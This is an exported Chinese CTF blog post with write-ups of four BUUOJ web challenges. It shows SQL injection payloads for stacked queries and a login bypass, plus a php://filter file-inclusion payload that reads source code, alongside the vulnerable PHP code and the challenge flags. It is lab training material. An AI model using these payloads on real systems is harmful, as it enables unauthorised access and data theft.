{"title":"BUUOJ刷题(2020-20-04)","uid":"586afb52f643078e9cf305f6eadf9480","slug":"BUUOJ刷题-2020-20-04","date":"2020-10-04T06:27:46.000Z","updated":"2021-06-28T14:57:53.070Z","comments":true,"path":"api/articles/BUUOJ刷题-2020-20-04.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","content":"<h2 id=\"0x01-SUCTF-2019-EasySQL\"><a href=\"#0x01-SUCTF-2019-EasySQL\" class=\"headerlink\" title=\"0x01 [SUCTF 2019]EasySQL\"></a>0x01 [SUCTF 2019]EasySQL</h2><p>这题经过测试可以知道会有三种情况，一种是回nonono，一种是回复数组，一种是没有回复。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201004182751.png\" alt=\"输入框\"></p>\n<p>通过nonono可以知道哪些被过滤了。例如from、flag、之类的都被过滤了，所以尝试使用堆叠注入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201004182940.png\" alt=\"查询表名\"></p>\n<p>可以看到有一个CTF数据库，里面有一个Flag表。不过卡在这里了，from我绕不过去，而且Flag也被ban了。想了好久都不知道如何去过，只好看一下WP了。</p>\n<p>看到有一种非预期解，好像当时泄露了，</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">\"select $_POST['query'] || flag from Flag\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这下终于知道是什么个情况了，非预期解法是传入*,1，这样最后sql语句就是：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">\"select *,1 || flag from Flag\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>就可以直接查出flag来：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201004213315.png\" alt=\"flag\"></p>\n<p>当然也有预期解法：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">\"select 1;set sql_mode=pipes_as_concat;select 1||flag from Flag\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>预期解用到了一个操作,之前没有关注过，set sql_mode=pipes_as_concat</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>sql_mode：是一组mysql支持的基本语法及校验规则<br>PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p></blockquote>\n<p>因为||成为了一个连接符，所以就可以顺利读出flag了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201004213355.png\" alt=\"预期解\"></p>\n<p>我们可以通过<code>@@sql_mode;select 1</code>来查看一下都有哪些sql_mode支持</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201004213559.png\" alt=\"sql mode\"></p>\n<p>这一题真的要求很博学了，要懂这个点才能去做，还要好好学啊。</p>\n<h2 id=\"0x02-极客大挑战-2019-EasySQL\"><a href=\"#0x02-极客大挑战-2019-EasySQL\" class=\"headerlink\" title=\"0x02 [极客大挑战 2019]EasySQL\"></a>0x02 [极客大挑战 2019]EasySQL</h2><p>在username处输入一个’号，报错了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201004213626.png\" alt=\"报错\"></p>\n<p>所以是有注入的可能的，不过这里注意到一点多出来的’居然跑到password上去了，这就很奇怪了。</p>\n<p>接着直接在username处试一试能不能绕过,结果并没有什么用。结果发现#、%23、–+都不太好使</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201004213725.png\" alt=\"2\"></p>\n<p>所以改了一下<code>username=admin&#39; or &#39;1&#39;=&#39;1&#39;&amp;password=123</code>,看到了如下的报错信息。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;1&#39;&#x3D;&#39;1&#39;&#39; and password&#x3D;&#39;123&#39;&#39; at line 1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>所以可以推测sql语句应该是这样的：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> xxx <span class=\"token keyword\">where</span> username<span class=\"token operator\">=</span><span class=\"token string\">\"xxx\"</span> <span class=\"token operator\">and</span> password<span class=\"token operator\">=</span><span class=\"token string\">\"xxx\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>然后现在我们用不了注释符，所以必须在password的结尾来绕过</p>\n<p>payload:</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">username<span class=\"token operator\">=</span>admin<span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span><span class=\"token number\">123</span><span class=\"token string\">' or '</span><span class=\"token number\">1</span><span class=\"token string\">'='</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这样传入进去构造出</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> xxx <span class=\"token keyword\">where</span> username<span class=\"token operator\">=</span><span class=\"token string\">\"admin\"</span> <span class=\"token operator\">and</span> password<span class=\"token operator\">=</span><span class=\"token string\">\"123\"</span> <span class=\"token operator\">or</span> <span class=\"token string\">\"1\"</span><span class=\"token operator\">=</span><span class=\"token string\">\"1\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>成功绕过了登陆限制。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201004213838.png\" alt=\"flag\"></p>\n<h2 id=\"0x03-极客大挑战-2019-Havefun\"><a href=\"#0x03-极客大挑战-2019-Havefun\" class=\"headerlink\" title=\"0x03 [极客大挑战 2019]Havefun\"></a>0x03 [极客大挑战 2019]Havefun</h2><p>撸猫还行，在源码里看到了一段php代码。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$cat</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cat'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$cat</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cat</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'dog'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Syc&#123;cat_cat_cat_cat&#125;'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>来试一试吧，传入一个cat，没有看到回显，现在传入一个cat=dog，竟然就直接出flag了，看来是签到题。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201004213914.png\" alt=\"flag\"></p>\n<h2 id=\"0x04-极客大挑战-2019-Secret-File\"><a href=\"#0x04-极客大挑战-2019-Secret-File\" class=\"headerlink\" title=\"0x04 [极客大挑战 2019]Secret File\"></a>0x04 [极客大挑战 2019]Secret File</h2><p>提示把一切都放在这了，看一前端代码，看到了一个php页面<code>Archive_room.php</code>\\</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201004213946.png\" alt=\"Archive_room.php\"></p>\n<p>点击了secret，直接跳转到了访问action.php</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201004214029.png\" alt=\"action\"></p>\n<p>但是访问过后跳转到了end.php而不是action.php</p>\n<p>所以bp抓包看看,果然如此，发现了真正的secr3c.php</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201004214202.png\" alt=\"真action.php\"></p>\n<p>访问一下secr3c.php，得到了一个php</p>\n<pre class=\"line-numbers language-php+HTML\" data-language=\"php+HTML\"><code class=\"language-php+HTML\">&lt;html&gt;\n    &lt;title&gt;secret&lt;&#x2F;title&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n&lt;?php\n    highlight_file(__FILE__);\n    error_reporting(0);\n    $file&#x3D;$_GET[&#39;file&#39;];\n    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;\n        echo &quot;Oh no!&quot;;\n        exit();\n    &#125;\n    include($file); \n&#x2F;&#x2F;flag放在了flag.php里\n?&gt;\n&lt;&#x2F;html&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>file=file:///var/www/html/flag.php，不能直接读，看来要用PHP伪协议。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201004214251.png\" alt=\"看不到\"></p>\n<p>payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>解码得到的base64,就可以得到源码了，flag就在里面：</p>\n<pre class=\"line-numbers language-php+HTML\" data-language=\"php+HTML\"><code class=\"language-php+HTML\">&lt;!DOCTYPE html&gt;\n\n&lt;html&gt;\n\n    &lt;head&gt;\n        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;\n        &lt;title&gt;FLAG&lt;&#x2F;title&gt;\n    &lt;&#x2F;head&gt;\n\n    &lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n        \n        &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n        \n        &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;\n            &lt;?php\n                echo &quot;我就在这里&quot;;\n                $flag &#x3D; &#39;flag&#123;1c8bc36a-9339-4e83-9525-491309a016f9&#125;&#39;;\n                $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;\n            ?&gt;\n        &lt;&#x2F;p&gt;\n    &lt;&#x2F;body&gt;\n\n&lt;&#x2F;html&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","text":"0x01 [SUCTF 2019]EasySQL这题经过测试可以知道会有三种情况，一种是回nonono，一种是回复数组，一种是没有回复。 通过nonono可以知道哪些被过滤了。例如from、flag、之类的都被过滤了，所以尝试使用堆叠注入。 可以看到有一个CTF数据库，里面有一个...","link":"","photos":[],"count_time":{"symbolsCount":"3.4k","symbolsTime":"3 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"SUCTF","slug":"SUCTF","count":2,"path":"api/tags/SUCTF.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-SUCTF-2019-EasySQL\"><span class=\"toc-text\">0x01 [SUCTF 2019]EasySQL</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL\"><span class=\"toc-text\">0x02 [极客大挑战 2019]EasySQL</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun\"><span class=\"toc-text\">0x03 [极客大挑战 2019]Havefun</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File\"><span class=\"toc-text\">0x04 [极客大挑战 2019]Secret File</span></a></li></ol>","author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"BUU刷题记录(2020-10-5-12)","uid":"e65725db6806e965008ebeaa6f55ead7","slug":"BUU刷题记录-2020-10-5-12","date":"2020-10-05T13:08:44.000Z","updated":"2021-06-28T14:57:44.243Z","comments":true,"path":"api/articles/BUU刷题记录-2020-10-5-12.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","text":"0x01 [极客大挑战 2019]PHP考点：PHP反序列化 上来就是一只喵，提示备份文件,试一试常见的备份格式，www.zip文件下载到本地。 解压后就这几个文件，其中index.php、flag.php、class.php才是重点，看一下都写了什么东西。 index.php：...","link":"","photos":[],"count_time":{"symbolsCount":"8.1k","symbolsTime":"7 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":14,"path":"api/tags/CTF.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"BUUOJ刷题小记","uid":"fbef6aca98c892cb1e786b7509bd311a","slug":"BUUOJ刷题小记","date":"2020-10-03T06:03:06.000Z","updated":"2021-06-28T14:59:58.824Z","comments":true,"path":"api/articles/BUUOJ刷题小记.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","text":"0x01 De1CTF SSRF Me考察代码审计 看名字感觉是SSRF的题目，但是打开发现更像是一题代码审计，给了一个flask框架的代码，有点长先做一下美化，在开始看。 #! /usr/bin/env python #encoding=utf-8 from flask imp...","link":"","photos":[],"count_time":{"symbolsCount":"7k","symbolsTime":"6 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"},{"name":"De1CTF 2019","slug":"De1CTF-2019","count":1,"path":"api/tags/De1CTF-2019.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}